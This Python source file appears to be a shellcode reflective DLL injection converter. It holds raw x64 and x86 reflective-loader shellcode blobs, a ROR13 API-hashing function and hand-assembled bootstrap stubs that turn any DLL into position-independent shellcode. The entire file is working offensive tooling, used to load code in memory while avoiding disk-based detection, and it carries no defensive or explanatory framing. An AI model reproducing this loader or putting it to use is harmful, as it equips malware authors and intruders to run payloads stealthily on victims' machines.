import sys, pefile
from struct import pack

#define IMAGE_NT_OPTIONAL_HDR32_MAGIC      0x10b
#define IMAGE_NT_OPTIONAL_HDR64_MAGIC      0x20b

def is64BitDLL(bytes):
    pe =  pefile.PE(data=bytes, fast_load=True)
    return (pe.OPTIONAL_HEADER.Magic == 0x20b)

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def HashFunctionName(name, module = None):

        function = name.encode() + b'\x00'

        if(module):
                module = module.upper().encode('UTF-16LE') + b'\x00\x00'

                functionHash = 0

                for b in function:
                        functionHash = ror(functionHash, 13, 32)
                        functionHash += b

                moduleHash = 0

                for b in module:
                        moduleHash = ror(moduleHash, 13, 32)
                        moduleHash += b

                functionHash += moduleHash

                if functionHash > 0xFFFFFFFF: functionHash -= 0x100000000

        else:
                functionHash = 0

                for b in function:
                        functionHash = ror(functionHash, 13, 32)
                        functionHash += b

        return functionHash

def ConvertToShellcode(dllBytes, functionHash=0x10, userData=b'None'):

    rdiShellcode64 = b"\xe9\x1b\x04\x00\x00\xcc\xcc\xcc\x48\x89\x5c\x24\x08\x48\x89\x74\x24\x10\x57\x48\x83\xec\x10\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x8b\xf1\x48\x8b\x50\x18\x4c\x8b\x4a\x10\x4d\x8b\x41\x30\x4d\x85\xc0\x0f\x84\xb4\x00\x00\x00\x41\x0f\x10\x41\x58\x49\x63\x40\x3c\x33\xd2\x4d\x8b\x09\xf3\x0f\x7f\x04\x24\x42\x8b\x9c\x00\x88\x00\x00\x00\x85\xdb\x74\xd4\x48\x8b\x04\x24\x48\xc1\xe8\x10\x44\x0f\xb7\xd0\x45\x85\xd2\x74\x21\x48\x8b\x4c\x24\x08\x45\x8b\xda\x0f\xbe\x01\xc1\xca\x0d\x80\x39\x61\x7c\x03\x83\xc2\xe0\x03\xd0\x48\xff\xc1\x49\x83\xeb\x01\x75\xe7\x4d\x8d\x14\x18\x33\xc9\x41\x8b\x7a\x20\x49\x03\xf8\x41\x39\x4a\x18\x76\x8f\x8b\x1f\x45\x33\xdb\x49\x03\xd8\x48\x8d\x7f\x04\x0f\xbe\x03\x48\xff\xc3\x41\xc1\xcb\x0d\x44\x03\xd8\x80\x7b\xff\x00\x75\xed\x41\x8d\x04\x13\x3b\xc6\x74\x0d\xff\xc1\x41\x3b\x4a\x18\x72\xd1\xe9\x5b\xff\xff\xff\x41\x8b\x42\x24\x03\xc9\x49\x03\xc0\x0f\xb7\x14\x01\x41\x8b\x4a\x1c\x49\x03\xc8\x8b\x04\x91\x49\x03\xc0\xeb\x02\x33\xc0\x48\x8b\x5c\x24\x20\x48\x8b\x74\x24\x28\x48\x83\xc4\x10\x5f\xc3\xcc\xcc\xcc\x44\x89\x4c\x24\x20\x4c\x89\x44\x24\x18\x89\x54\x24\x10\x53\x55\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x83\xec\x38\x48\x8b\xe9\x45\x8b\xe1\xb9\x4c\x77\x26\x07\x44\x8b\xf2\xe8\xd7\xfe\xff\xff\xb9\x49\xf7\x02\x78\x4c\x8b\xe8\xe8\xca\xfe\xff\xff\xb9\x58\xa4\x53\xe5\x48\x89\x84\x24\x80\x00\x00\x00\xe8\xb8\xfe\xff\xff\xb9\xaf\xb1\x5c\x94\x48\x8b\xd8\xe8\xab\xfe\xff\xff\x48\x63\x75\x3c\x33\xc9\x48\x03\xf5\x48\x89\x44\x24\x20\x41\xb8\x00\x30\x00\x00\x4c\x8b\xf8\x44\x8d\x49\x40\x8b\x56\x50\xff\xd3\x44\x8b\x46\x54\x48\x8b\xf8\x48\x8b\xcd\x41\xbb\x01\x00\x00\x00\x4d\x85\xc0\x74\x13\x48\x8b\xd0\x48\x2b\xd5\x8a\x01\x88\x04\x0a\x49\x03\xcb\x4d\x2b\xc3\x75\xf3\x44\x0f\xb7\x4e\x06\x0f\xb7\x46\x14\x4d\x85\xc9\x74\x38\x48\x8d\x4e\x2c\x48\x03\xc8\x8b\x51\xf8\x4d\x2b\xcb\x44\x8b\x01\x48\x03\xd7\x44\x8b\x51\xfc\x4c\x03\xc5\x4d\x85\xd2\x74\x10\x41\x8a\x00\x4d\x03\xc3\x88\x02\x49\x03\xd3\x4d\x2b\xd3\x75\xf0\x48\x83\xc1\x28\x4d\x85\xc9\x75\xcf\x8b\x9e\x90\x00\x00\x00\x48\x03\xdf\x8b\x43\x0c\x85\xc0\x0f\x84\x91\x00\x00\x00\x48\x8b\xac\x24\x80\x00\x00\x00\x8b\xc8\x48\x03\xcf\x41\xff\xd5\x44\x8b\x3b\x4c\x8b\xe0\x44\x8b\x73\x10\x4c\x03\xff\x4c\x03\xf7\xeb\x49\x49\x83\x3f\x00\x7d\x29\x49\x63\x44\x24\x3c\x41\x0f\xb7\x17\x42\x8b\x8c\x20\x88\x00\x00\x00\x42\x8b\x44\x21\x10\x42\x8b\x4c\x21\x1c\x48\x2b\xd0\x49\x03\xcc\x8b\x04\x91\x49\x03\xc4\xeb\x0f\x49\x8b\x16\x49\x8b\xcc\x48\x83\xc2\x02\x48\x03\xd7\xff\xd5\x49\x89\x06\x49\x83\xc6\x08\x49\x83\xc7\x08\x49\x83\x3e\x00\x75\xb1\x8b\x43\x20\x48\x83\xc3\x14\x85\xc0\x75\x8c\x44\x8b\xb4\x24\x88\x00\x00\x00\x4c\x8b\x7c\x24\x20\x44\x8b\xa4\x24\x98\x00\x00\x00\x4c\x8b\xd7\x41\xbd\x02\x00\x00\x00\x4c\x2b\x56\x30\x83\xbe\xb4\x00\x00\x00\x00\x41\x8d\x6d\xff\x0f\x84\x97\x00\x00\x00\x44\x8b\x86\xb0\x00\x00\x00\x4c\x03\xc7\x41\x8b\x40\x04\x85\xc0\x0f\x84\x81\x00\x00\x00\xbb\xff\x0f\x00\x00\x41\x8b\x10\x4d\x8d\x58\x08\x44\x8b\xc8\x48\x03\xd7\x49\x83\xe9\x08\x49\xd1\xe9\x74\x57\x41\x0f\xb7\x0b\x4c\x2b\xcd\x0f\xb7\xc1\x66\xc1\xe8\x0c\x66\x83\xf8\x0a\x75\x09\x48\x23\xcb\x4c\x01\x14\x11\xeb\x32\x66\x83\xf8\x03\x75\x09\x48\x23\xcb\x44\x01\x14\x11\xeb\x23\x66\x3b\xc5\x75\x10\x48\x23\xcb\x49\x8b\xc2\x48\xc1\xe8\x10\x66\x01\x04\x11\xeb\x0e\x66\x41\x3b\xc5\x75\x08\x48\x23\xcb\x66\x44\x01\x14\x11\x4d\x03\xdd\x4d\x85\xc9\x75\xa9\x41\x8b\x40\x04\x4c\x03\xc0\x41\x8b\x40\x04\x85\xc0\x75\x84\x8b\x5e\x28\x45\x33\xc0\x33\xd2\x48\x83\xc9\xff\x48\x03\xdf\x41\xff\xd7\x4c\x8b\xc5\x8b\xd5\x48\x8b\xcf\xff\xd3\x45\x85\xf6\x0f\x84\x93\x00\x00\x00\x83\xbe\x8c\x00\x00\x00\x00\x0f\x84\x86\x00\x00\x00\x8b\x96\x88\x00\x00\x00\x48\x03\xd7\x44\x8b\x5a\x18\x45\x85\xdb\x74\x74\x83\x7a\x14\x00\x74\x6e\x44\x8b\x52\x20\x33\xdb\x44\x8b\x4a\x24\x4c\x03\xd7\x4c\x03\xcf\x45\x85\xdb\x74\x59\x45\x8b\x02\x4c\x03\xc7\x33\xc9\x41\x0f\xbe\x00\x4c\x03\xc5\xc1\xc9\x0d\x03\xc8\x41\x80\x78\xff\x00\x75\xed\x44\x3b\xf1\x74\x10\x03\xdd\x49\x83\xc2\x04\x4d\x03\xcd\x41\x3b\xdb\x72\xd2\xeb\x29\x41\x0f\xb7\x01\x83\xf8\xff\x74\x20\x8b\x52\x1c\x48\x8b\x8c\x24\x90\x00\x00\x00\xc1\xe0\x02\x48\x98\x48\x03\xc7\x44\x8b\x04\x02\x41\x8b\xd4\x4c\x03\xc7\x41\xff\xd0\x48\x8b\xc7\x48\x83\xc4\x38\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5d\x5b\xc3\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x56\x48\x8b\xf4\x48\x83\xe4\xf0\x48\x83\xec\x20\xe8\xcf\xfc\xff\xff\x48\x8b\xe6\x5e\xc3";
    rdiShellcode32 = b"\x83\xec\x18\x53\x55\x56\x57\xb9\x4c\x77\x26\x07\xe8\x9d\x02\x00\x00\xb9\x49\xf7\x02\x78\x89\x44\x24\x18\xe8\x8f\x02\x00\x00\xb9\x58\xa4\x53\xe5\x89\x44\x24\x1c\xe8\x81\x02\x00\x00\xb9\xaf\xb1\x5c\x94\x8b\xf0\xe8\x75\x02\x00\x00\x8b\x6c\x24\x2c\x6a\x40\x68\x00\x30\x00\x00\x89\x44\x24\x2c\x8b\x5d\x3c\x03\xdd\x89\x5c\x24\x18\xff\x73\x50\x6a\x00\xff\xd6\x8b\x73\x54\x8b\xf8\x89\x7c\x24\x20\x8b\xd5\x85\xf6\x74\x0f\x8b\xcf\x2b\xcd\x8a\x02\x88\x04\x11\x42\x83\xee\x01\x75\xf5\x0f\xb7\x6b\x06\x0f\xb7\x43\x14\x85\xed\x74\x34\x8d\x4b\x2c\x03\xc8\x8b\x44\x24\x2c\x8b\x51\xf8\x4d\x8b\x31\x03\xd7\x8b\x59\xfc\x03\xf0\x85\xdb\x74\x0f\x8a\x06\x88\x02\x42\x46\x83\xeb\x01\x75\xf5\x8b\x44\x24\x2c\x83\xc1\x28\x85\xed\x75\xd9\x8b\x5c\x24\x10\x8b\xb3\x80\x00\x00\x00\x03\xf7\x89\x74\x24\x14\x8b\x46\x0c\x85\xc0\x74\x7d\x03\xc7\x50\xff\x54\x24\x1c\x8b\x6e\x10\x8b\xd8\x8b\x06\x03\xef\x03\xc7\x89\x44\x24\x2c\x83\x7d\x00\x00\x74\x4f\x8b\x74\x24\x1c\x8b\x08\x85\xc9\x74\x1e\x79\x1c\x8b\x43\x3c\x0f\xb7\xc9\x8b\x44\x18\x78\x2b\x4c\x18\x10\x8b\x44\x18\x1c\x8d\x04\x88\x8b\x04\x18\x03\xc3\xeb\x0c\x8b\x45\x00\x83\xc0\x02\x03\xc7\x50\x53\xff\xd6\x89\x45\x00\x83\xc5\x04\x8b\x44\x24\x2c\x83\xc0\x04\x89\x44\x24\x2c\x83\x7d\x00\x00\x75\xb9\x8b\x74\x24\x14\x8b\x46\x20\x83\xc6\x14\x89\x74\x24\x14\x85\xc0\x75\x87\x8b\x5c\x24\x10\x8b\xef\xc7\x44\x24\x18\x01\x00\x00\x00\x2b\x6b\x34\x83\xbb\xa4\x00\x00\x00\x00\x0f\x84\xaa\x00\x00\x00\x8b\x93\xa0\x00\x00\x00\x03\xd7\x89\x54\x24\x2c\x8d\x4a\x04\x8b\x01\x89\x4c\x24\x14\x85\xc0\x0f\x84\x8d\x00\x00\x00\x8b\x32\x8d\x58\xf8\x03\xf7\x8d\x42\x08\xd1\xeb\x89\x44\x24\x1c\x74\x60\x6a\x02\x8b\xf8\x5a\x0f\xb7\x0f\x4b\x66\x8b\xc1\x66\xc1\xe8\x0c\x66\x83\xf8\x0a\x74\x06\x66\x83\xf8\x03\x75\x0b\x81\xe1\xff\x0f\x00\x00\x01\x2c\x31\xeb\x27\x66\x3b\x44\x24\x18\x75\x11\x81\xe1\xff\x0f\x00\x00\x8b\xc5\xc1\xe8\x10\x66\x01\x04\x31\xeb\x0f\x66\x3b\xc2\x75\x0a\x81\xe1\xff\x0f\x00\x00\x66\x01\x2c\x31\x03\xfa\x85\xdb\x75\xb1\x8b\x7c\x24\x20\x8b\x54\x24\x2c\x8b\x4c\x24\x14\x03\x11\x89\x54\x24\x2c\x8d\x4a\x04\x8b\x01\x89\x4c\x24\x14\x85\xc0\x0f\x85\x77\xff\xff\xff\x8b\x5c\x24\x10\x8b\x73\x28\x6a\x00\x6a\x00\x6a\xff\x03\xf7\xff\x54\x24\x30\x33\xc0\x40\x50\x50\x57\xff\xd6\x83\x7c\x24\x30\x00\x74\x7c\x83\x7b\x7c\x00\x74\x76\x8b\x4b\x78\x03\xcf\x8b\x41\x18\x85\xc0\x74\x6a\x83\x79\x14\x00\x74\x64\x8b\x69\x20\x8b\x71\x24\x03\xef\x83\x64\x24\x2c\x00\x03\xf7\x85\xc0\x74\x51\x8b\x5d\x00\x03\xdf\x33\xd2\x0f\xbe\x03\xc1\xca\x0d\x03\xd0\x43\x80\x7b\xff\x00\x75\xf1\x39\x54\x24\x30\x74\x16\x8b\x44\x24\x2c\x83\xc5\x04\x40\x83\xc6\x02\x89\x44\x24\x2c\x3b\x41\x18\x72\xd0\xeb\x1f\x0f\xb7\x16\x83\xfa\xff\x74\x17\x8b\x41\x1c\xff\x74\x24\x38\xff\x74\x24\x38\x8d\x04\x90\x8b\x04\x38\x03\xc7\xff\xd0\x59\x59\x8b\xc7\x5f\x5e\x5d\x5b\x83\xc4\x18\xc3\x83\xec\x10\x64\xa1\x30\x00\x00\x00\x53\x55\x56\x8b\x40\x0c\x57\x89\x4c\x24\x18\x8b\x70\x0c\xe9\x8a\x00\x00\x00\x8b\x46\x30\x33\xc9\x8b\x5e\x2c\x8b\x36\x89\x44\x24\x14\x8b\x42\x3c\x8b\x6c\x10\x78\x89\x6c\x24\x10\x85\xed\x74\x6d\xc1\xeb\x10\x33\xff\x85\xdb\x74\x1f\x8b\x6c\x24\x14\x8a\x04\x2f\xc1\xc9\x0d\x3c\x61\x0f\xbe\xc0\x7c\x03\x83\xc1\xe0\x03\xc8\x47\x3b\xfb\x72\xe9\x8b\x6c\x24\x10\x8b\x44\x2a\x20\x33\xdb\x8b\x7c\x2a\x18\x03\xc2\x89\x7c\x24\x14\x85\xff\x74\x31\x8b\x28\x33\xff\x03\xea\x83\xc0\x04\x89\x44\x24\x1c\x0f\xbe\x45\x00\xc1\xcf\x0d\x03\xf8\x45\x80\x7d\xff\x00\x75\xf0\x8d\x04\x0f\x3b\x44\x24\x18\x74\x20\x8b\x44\x24\x1c\x43\x3b\x5c\x24\x14\x72\xcf\x8b\x56\x18\x85\xd2\x0f\x85\x6b\xff\xff\xff\x33\xc0\x5f\x5e\x5d\x5b\x83\xc4\x10\xc3\x8b\x74\x24\x10\x8b\x44\x16\x24\x8d\x04\x58\x0f\xb7\x0c\x10\x8b\x44\x16\x1c\x8d\x04\x88\x8b\x04\x10\x03\xc2\xeb\xdb";

    if is64BitDLL(dllBytes):

        rdiShellcode = rdiShellcode64

        bootstrap = b''
        bootstrapSize = 34

        # call next instruction (Pushes next instruction address to stack)
        bootstrap += b'\xe8\x00\x00\x00\x00'

                #Here is where the we pop the address of our next instruction off the stack and into the first register
                # pop rcx
        bootstrap += b'\x59'

                # mov r8, rcx - copy our location in memory to r8 before we start modifying RCX
        bootstrap += b'\x49\x89\xc8'

                # Setup the location of the DLL into RCX
                # add rcx, 29 (Size of bootstrap from pop) + <Length of RDI Shellcode>
        bootstrap += b'\x48\x81\xc1'
        dllLocation = bootstrapSize - 5 + len(rdiShellcode);
        bootstrap += pack('I', dllLocation)

        # mov edx, <hash of function>
        bootstrap += b'\xba'
        bootstrap += pack('I', functionHash)

        # Setup the location of our user data
        # add r8, (Size of bootstrap) + <Length of RDI Shellcode> + <Length of DLL>
        bootstrap += b'\x49\x81\xc0'
        userDataLocation = bootstrapSize - 5 + len(rdiShellcode) + len(dllBytes);
        bootstrap += pack('I', userDataLocation)

        # mov r9d, <Length of User Data>
        bootstrap += b'\x41\xb9'
        bootstrap += pack('I', len(userData))

        # Ends up looking like this in memory:
        # Bootstrap shellcode
        # RDI shellcode
        # DLL bytes
        # User data
        return bootstrap + rdiShellcode + dllBytes + userData

    else: # 32 bit
        rdiShellcode = rdiShellcode32

        bootstrap = b''
        bootstrapSize = 40

        # call next instruction (Pushes next instruction address to stack)
        bootstrap += b'\xe8\x00\x00\x00\x00'

                #Here is where the we pop the address of our next instruction off the stack and into the first register
                # pop rcx
        bootstrap += b'\x58'

                # mov ebx, eax - copy our location in memory to ebx before we start modifying eax
        bootstrap += b'\x89\xc3'

                # add eax, <size of bootstrap> + <Size of RDI Shellcode>
        bootstrap += b'\x05'
        dllLocation = bootstrapSize - 5 + len(rdiShellcode);
        bootstrap += pack('I', dllLocation)

        # add ebx, <size of bootstrap> + <Size of RDI Shellcode> + <Size of DLL>
        bootstrap += b'\x81\xc3'
        userDataLocation = bootstrapSize - 5 + len(rdiShellcode) + len(dllBytes);
        bootstrap += pack('I', userDataLocation)

        # push <Length of User Data>
        bootstrap += b'\x68'
        bootstrap += pack('I', len(userData))

        # push ebx
        bootstrap += b'\x53'

        # push <hash of function>
        bootstrap += b'\x68'
        bootstrap += pack('I', functionHash)

        # push eax
        bootstrap += b'\x50'

        # call instruction - We need to transfer execution to the RDI assembly this way (Skip over our next few op codes)
        bootstrap += b'\xe8\x04\x00\x00\x00'

        # add esp, 0x10 - RDI pushes things to the stack it never removes, we need to make the correction ourselves
        bootstrap += b'\x83\xc4\x10'

        # ret - because we used call earlier
        bootstrap += b'\xc3'

        # Ends up looking like this in memory:
        # Bootstrap shellcode
        # RDI shellcode
        # DLL bytes
        # User data
        return bootstrap + rdiShellcode + dllBytes + userData

    return False;